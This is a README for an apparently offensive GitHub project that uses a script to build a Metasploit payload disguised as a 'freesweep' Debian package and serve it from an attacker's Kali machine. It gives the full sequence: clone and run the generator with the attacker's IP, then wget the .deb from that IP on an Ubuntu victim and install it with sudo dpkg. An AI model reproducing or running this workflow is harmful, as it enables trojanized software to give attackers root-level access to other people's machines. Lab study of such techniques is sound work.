"# LinuxPayload" 

For details use the read metasploit_tutorial.docx

Run the following in kali linux to generate and serve the payload in webserver.
	
	git clone https://github.com/kaushik-ayinala/LinuxPayload.git
	cd LinuxPayload
	sh payload.sh [IP]  

#In the last command, IP refers to the IP of attacker/kali machine Eg: sh payload.sh 10.0.2.6

Download and install generated payload in ubuntu 

	wget http://[IP]/freesweep.deb
	sudo dpkg -i freesweep.deb

#In the first command, IP refers to the IP of attacker/kali machine Eg: wget http://10.0.2.6/freesweep.deb

